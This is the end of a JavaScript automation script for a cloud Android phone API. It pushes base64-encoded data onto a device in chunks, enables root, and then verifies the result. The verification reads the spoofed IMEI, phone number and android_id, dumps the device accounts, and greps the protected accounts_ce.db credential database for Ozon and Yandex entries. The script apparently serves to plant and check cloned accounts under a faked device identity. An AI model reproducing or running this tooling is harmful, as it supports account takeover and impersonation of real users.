  if (!r.includes('OK')) return r;
  for (let i = CHUNK; i < clean.length; i += CHUNK) {
    r = await syncCmd(pad, `printf '%s' '${clean.slice(i, i + CHUNK)}' >> "${tmp}" && echo OK`, 10);
    if (!r.includes('OK')) return r;
  }
  return await syncCmd(pad, `base64 -d "${tmp}" > "${destPath}" && rm -f "${tmp}" && echo OK`, 15);
}

async function verifyD2() {
  log('\n▶ VERIFICATION');
  await apiPost('/vcpcloud/api/padApi/switchRoot', { padCodes: [D2], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
  await sleep(3000);
  
  const verify = await syncCmd(D2, [
    'echo "=== ROOT ==="; id',
    'echo "=== IDENTITY ==="; getprop persist.sys.cloud.imeinum; getprop persist.sys.cloud.phonenum; settings get secure android_id',
    'echo "=== ACCOUNTS ==="; dumpsys account 2>&1 | head -15',
    'echo "=== APPS ==="; pm list packages -3 2>/dev/null | wc -l',
    'echo "=== DB ==="; ls -la /data/system_ce/0/accounts_ce.db /data/system_de/0/accounts_de.db 2>/dev/null',
    'echo "=== STRINGS ==="; strings /data/system_ce/0/accounts_ce.db 2>/dev/null | grep -iE "ozon|yandex" | head -3',
  ].join('; '), 30);
  log(verify);
  
  log('\n═══════════════════════════════════════');
  log('  COMPLETE');
  log('═══════════════════════════════════════');
}

main().catch(e => console.error('FATAL:', e));
